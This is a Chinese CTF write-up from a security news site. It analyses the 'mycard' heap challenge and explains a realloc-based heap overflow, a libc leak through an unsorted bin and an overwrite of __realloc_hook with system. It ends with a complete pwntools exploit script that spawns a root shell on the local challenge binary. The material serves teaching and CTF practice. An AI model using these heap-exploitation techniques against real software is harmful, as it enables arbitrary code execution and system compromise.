@@ -1,0 +1,362 @@
+# 安恒月赛mycard exp编写及详细分析
+
+阅读量 **292652**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-01-30 10:20:29
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t0149b68484227cba60.jpg)
+
+程序源文件:
+
+链接：<https://pan.baidu.com/s/13HavhR0UVg0c9SYfZzAX5g>
+
+提取码：t8rt
+
+昨天做了这道题没做出来,看了wp却只有思路没有exp,于是自己又捣鼓了一天写出了详细的程序分析和exp编写,适合新手一起学习.建议边调试边阅读.
+
+## 1.值得学习的地方:
+
+程序canary,nx,pie,aslr全开,所以要绕过特定保护
+
+如何泄露地址.
+
+如何利用realloc.
+
+逆向分析链表结构.
+
+## 2.程序分析
+
+canary,nx,pie,aslr保护开启
+
+3个功能.create,edit, delete
+
+create分析:
+
+首先向栈中输入name,这里没有栈溢出,再输入描述(desc表示)的长度(desc_len),该处也没有栈溢出.通过strtol将desc_len字符串转为数字作为malloc的参数,进行分配desc的内存.
+大小不能大于1024字节,然后输入desc.
+
+继续分配一个结构体,如下:
+
+    
+    
+    struct moon{
+      char name[0x40];
+      dword desc_len;
+    char desc[desc_len];
+    };
+    
+
+该结构也是通过malloc分配的.然后将name通过strncpy复制到moon中,写入desc_len,
+
+再通过memcpy复制desc到其中. 这里检查严格,都没有堆溢出.
+
+由于desc已经复制到moon中了,所以将之前分配的desc释放掉.
+
+继续分配一个结构体如下:
+
+    
+    
+    strcut node
+    {
+      struct moon p;
+      strcut node pre;//程序使用了双链表结构,这个指向前一个节点,如果是第一个则指向自己
+      strcut node* next;///程序使用了双链表结构,这个指向下一个节点
+    }
+
+将p指向新分配的moon后,插入到链表头ptr,该全局变量位于.bss节上.
+
+插入方式是再双链表末尾插入.
+
+里面构建这样一个链表结构:
+
+![](https://upload-images.jianshu.io/upload_images/15360385-c75eafbafbc8dbb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+
+help:
+
+该函数遍历双链表,将已有的moon的name和desc通过write输出,而且这里的write输出长度固定,如下图,所以可以用于泄露libc基址.最后记录链表node个数并返回.
+
+![](https://upload-images.jianshu.io/upload_images/15360385-38908c623019e3a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+
+edit:
+
+首先通过help得到node个数,如果为空,直接返回.再继续输入id号,当id号非法则相当于只show而不edit了,再输入name,将其写入到目标结构的name成员.再输入长度,转为数字,判断数字是否比原来的desc大,如果没有则用新输入的desc覆盖写入,否则通过realloc重新分配堆内存再写入desc成员中.
+
+关键点如下:
+
+![](https://upload-images.jianshu.io/upload_images/15360385-6b462ff54a03d438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+
+这个判断有问题,导致0x44字节的堆溢出. 由此可知如果通过堆溢出修改到一个node节点的p指针,然后再次edit它,不就能实现任意地址写任意数据了.
+
+此外细心点发现,realloc分配的内存竟然只将最低1字节写入了该结构.所以构造时要小心.
+
+delete分析:
+
+首先还是通过help得到链表节点数,如果为0直接退出.然后输入id.由于create时,第一个node的pre指针指向自己,所以程序通过判断是否id为1,当id=1和>1是不同的处理逻辑.
+
+但最终还是正常地摘下某个节点,使链表仍然保持双链表结构.摘下节点后,先释放节点的p指向的结构的内存,然后释放节点内存.
+
+## 3.漏洞利用分析
+
+首先是地址泄露.从上面的分析可知,当创建一个moon后再释放,代码及堆结构如下:
+
+    
+    
+    create('asdf',0xc+0x40,'desc')#这里使为了使moon内存分配的大小为0x90(0x4c+0x4+0x40),释放后在unsorted bin中.这里0x90+head的0x10字节就是0xa了.
+    delete(1)
+    
+    gef➤  heap chunks
+    Chunk(addr=0x555debb46010, size=0x60, flags=PREV_INUSE)这个是释放后的desc
+        [0x0000555debb46010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
+    Chunk(addr=0x555debb46070, size=0xa0, flags=PREV_INUSE)这里是释放后的moon结构
+        [0x0000555debb46070     78 4b 92 2f 4b 7f 00 00 78 4b 92 2f 4b 7f 00 00    xK./K...xK./K...]
+    Chunk(addr=0x555debb46110, size=0x20, flags=)这里是释放后的node结构
+        [0x0000555debb46110     00 00 00 00 00 00 00 00 10 61 b4 eb 5d 55 00 00    .........a..]U..]
+    Chunk(addr=0x555debb46130, size=0x20ee0, flags=PREV_INUSE)  ←  top chunk
+    
+    ────────────────────────── Fastbins for arena 0x7f4b2f924b20 ──────────────────────────
+    Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x555debb46110, size=0x20, flags=) 
+    Fastbins[idx=1, size=0x20] 0x00
+    Fastbins[idx=2, size=0x30] 0x00
+    Fastbins[idx=3, size=0x40] 0x00
+    Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x555debb46010, size=0x60, flags=PREV_INUSE) 
+    Fastbins[idx=5, size=0x60] 0x00
+    Fastbins[idx=6, size=0x70] 0x00
+    ───────────────────────── Unsorted Bin for arena 'main_arena' ─────────────────────────
+    [+] unsorted_bins[0]: fw=0x555debb46060, bk=0x555debb46060
+     →   Chunk(addr=0x555debb46070, size=0xa0, flags=PREV_INUSE)
+    [+] Found 1 chunks in unsorted bin.
+    ────────────────────────── Small Bins for arena 'main_arena' ──────────────────────────
+    [+] Found 0 chunks in 0 small non-empty bins.
+    ────────────────────────── Large Bins for arena 'main_arena' ──────────────────────────
+    [+] Found 0 chunks in 0 large non-empty bins.
+    
+
+再申请内存,并输出:
+
+    
+    
+    create('name',0x90,'qwer')#让desc分配为上次释放的内存,这样后8字节指向main_arena中了,通过write输出即可泄露libc基址.
+    print p.recvuntil('4:exitn') 
+    p.sendline('3')
+    print p.recvuntil('Description :qwer')
+    heap_addr = p.recvuntil('>') #由于将desc复制到moon结构中,通过edit将信息泄露
+    p.sendline(str(123))#输入非法id,使只输出信息,不进行edit,就返回.
+    
+    heap_addr = heap_addr[4:12]
+    heap_addr = u64(heap_addr)
+    print 'heap_addr: ',hex(heap_addr)
+    libc_base = heap_addr-0x3c4b78
+    print 'libc base:', hex(libc_base)
+    
+    [1] Name :name
+    Description :qwer
+    heap_addr:  0x7f4b2f924b78
+    libc base: 0x7f4b2f560000
+    
+
+由此已经得到libc基址
+
+再思考如何利用edit实现任意地址写任意数据.如果能够构造当前realloc之后的moon堆块的下一个堆块是某个node所在的内存,那就可以通过修改下一个node的p指针为
+**realloc_hook的地址,然后edit这个node,使用name写入system到**
+realloc_hook,再通过调用realloc而转入调用__realloc_hook劫持程序.
+
+    
+    
+    create('second', 0xa0,'asdf')
+    create('third', 0xc,'asdf')
+    create('fourth',0x50,'asdf')
+    delete(2)
+    
+    此时堆块情况如下:
+    gef➤  heap chunks
+    Chunk(addr=0x555debb46010, size=0x60, flags=PREV_INUSE)第3个的moon
+        [0x0000555debb46010     74 68 69 72 64 00 00 00 00 00 00 00 00 00 00 00    third...........]
+    Chunk(addr=0x555debb46070, size=0x20, flags=PREV_INUSE)第2个的node,已free,在fastbin
+        [0x0000555debb46070     00 00 00 00 00 00 00 00 10 61 b4 eb 5d 55 00 00    .........a..]U..]
+    Chunk(addr=0x555debb46090, size=0x20, flags=PREV_INUSE)第3个的node
+        [0x0000555debb46090     10 60 b4 eb 5d 55 00 00 78 60 b4 eb 5d 55 00 00    .`..]U..x`..]U..]
+    Chunk(addr=0x555debb460b0, size=0x60, flags=PREV_INUSE)已free,在fastbin
+        [0x0000555debb460b0     00 00 00 00 00 00 00 00 78 4b 92 2f 4b 7f 00 00    ........xK./K...]
+    Chunk(addr=0x555debb46110, size=0x20, flags=PREV_INUSE)第1个的node
+        [0x0000555debb46110     30 61 b4 eb 5d 55 00 00 10 61 b4 eb 5d 55 00 00    0a..]U...a..]U..]
+    Chunk(addr=0x555debb46130, size=0xe0, flags=PREV_INUSE)第1个的moon
+        [0x0000555debb46130     6e 61 6d 65 00 00 00 00 00 00 00 00 00 00 00 00    name............]
+    Chunk(addr=0x555debb46210, size=0xb0, flags=PREV_INUSE)第4个的moon
+        [0x0000555debb46210     66 6f 75 72 74 68 00 00 00 00 00 00 00 00 00 00    fourth..........]
+    Chunk(addr=0x555debb462c0, size=0xf0, flags=PREV_INUSE)第2个的moon,已free,在unsorted bin
+        [0x0000555debb462c0     78 4b 92 2f 4b 7f 00 00 78 4b 92 2f 4b 7f 00 00    xK./K...xK./K...]
+    Chunk(addr=0x555debb463b0, size=0x20, flags=)第4个的node
+        [0x0000555debb463b0     10 62 b4 eb 5d 55 00 00 90 60 b4 eb 5d 55 00 00    .b..]U...`..]U..]
+    Chunk(addr=0x555debb463d0, size=0x20c40, flags=PREV_INUSE)  ←  top chunk
+    
+    gef➤  heap bins
+    [+] No Tcache in this version of libc
+    ────────────────────────────────────────────────────────────────── Fastbins for arena 0x7f4b2f924b20 ──────────────────────────────────────────────────────────────────
+    Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x555debb46070, size=0x20, flags=PREV_INUSE) 
+    Fastbins[idx=1, size=0x20] 0x00
+    Fastbins[idx=2, size=0x30] 0x00
+    Fastbins[idx=3, size=0x40] 0x00
+    Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x555debb460b0, size=0x60, flags=PREV_INUSE) 
+    Fastbins[idx=5, size=0x60] 0x00
+    Fastbins[idx=6, size=0x70] 0x00
+    ───────────────────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ─────────────────────────────────────────────────────────────────
+    [+] unsorted_bins[0]: fw=0x555debb462b0, bk=0x555debb462b0
+     →   Chunk(addr=0x555debb462c0, size=0xf0, flags=PREV_INUSE)
+    [+] Found 1 chunks in unsorted bin.
+    ────────────────────────────────────────────────────────────────── Small Bins for arena 'main_arena' ──────────────────────────────────────────────────────────────────
+    [+] Found 0 chunks in 0 small non-empty bins.
+    ────────────────────────────────────────────────────────────────── Large Bins for arena 'main_arena' ──────────────────────────────────────────────────────────────────
+    [+] Found 0 chunks in 0 large non-empty bins.
+    从这里可以发现,再次edit 节点2的时候(此时edit的是原来的第3个,因为第2个被delete掉了,后面的往前减1). 可以通过1字节的realloc地址再低位写入c0,即:0x555debb46010-->0x555debb460c0而第1个的node地址为0x555debb46110.只相差0x50字节,通过edit就可以将第1个node的p指针写入__realloc_hook地址.
+    
+
+getshell:
+
+    
+    
+    payload = 'a'*(0xc)#从0x555debb460c0+0x44开始写,故填充0xc个'a'就能到下一个
+    node了
+    payload += p64(malloc_hook_addr)#修改第1个node为__realloc_hook地址
+    edit(2,'asdf',0xa0,payload)
+    edit(1,p64(one_gadget),0x20,'asdf')#修改__realloc_hook为system地址
+    edit(2,'/bin/shx00',0x300,'asdf')#getshell!!. 
+    .........
+    Len?
+    Description :
+    [*] Switching to interactive mode
+    /bin/sh: 1: asdf: not found
+    whoami
+    root
+    
+
+## 4.总结
+
+通过修改hook绕过pie,alsr等保护
+
+通过write和unsorted bin泄露libc
+
+通过realloc和堆自身的分配机制和堆溢出实现修改任意内存.
+
+本题的堆分配及释放较复杂, 需要逆向分析链表结构, 所以通过一边分析一边调试还是对新手很有收获的.
+
+## 5.附上完整exp:
+
+    
+    
+    from pwn import *
+    
+    
+    p = process('./mycard')
+    libc = ELF('./libc.so.6')
+    elf = ELF('./mycard')
+    
+    
+    def create(name,desc_len,desc):
+        print p.recvuntil('4:exitn')
+        p.sendline('1')
+        print p.recvuntil('Name:')
+        p.sendline(name)
+        print p.recvuntil('Len:')
+        p.sendline(str(desc_len))
+        print p.recvuntil('Description:')
+        p.sendline(desc)
+        return
+    
+    def delete(no):
+        print p.recvuntil('4:exitn') 
+        p.sendline('2')
+        print p.recvuntil('>')
+        p.sendline(str(no))
+        return
+    
+    def edit(no, name, desc_len, desc):
+        print p.recvuntil('4:exitn') 
+        p.sendline('3')
+        print p.recvuntil('>')
+        p.sendline(str(no))
+        print p.recvuntil('New name?')
+        p.sendline(name)
+        print p.recvuntil('Len?')
+        p.sendline(str(desc_len))
+        print p.recvuntil('Description :')
+        p.sendline(desc)
+        return
+    
+    create('asdf',0xc+0x40,'desc')
+    #gdb.attach(p)
+    delete(1)
+    create('name',0x90,'qwer')
+    
+    
+    
+    print p.recvuntil('4:exitn') 
+    p.sendline('3')
+    print p.recvuntil('Description :qwer')
+    heap_addr = p.recvuntil('>')
+    p.sendline(str(123))
+    
+    
+    heap_addr = heap_addr[4:12]
+    heap_addr = u64(heap_addr)
+    print 'heap_addr: ',hex(heap_addr)
+    libc_base = heap_addr-0x3c4b78
+    print 'libc base:', hex(libc_base)
+    
+    malloc_hook_addr = libc_base+libc.sym['__realloc_hook']
+    one_gadget = libc_base+libc.sym['system']
+    
+    
+    create('second', 0xa0,'asdf')
+    create('third', 0xc,'asdf')
+    create('fourth',0x50,'asdf')
+    delete(2)
+    
+    payload = 'a'*(0xc)
+    payload += p64(malloc_hook_addr)
+    edit(2,'asdf',0xa0,payload)
+    edit(1,p64(one_gadget),0x20,'asdf')
+    edit(2,'/bin/shx00',0x300,'asdf')
+    
+    p.interactive()
+    
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **fIappy** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/170359](/post/id/170359)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+
+ **+1** __6赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/qqapp/101430193/802BC6DD735DFFC762C8153B5954C926/40)
+fIappy
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
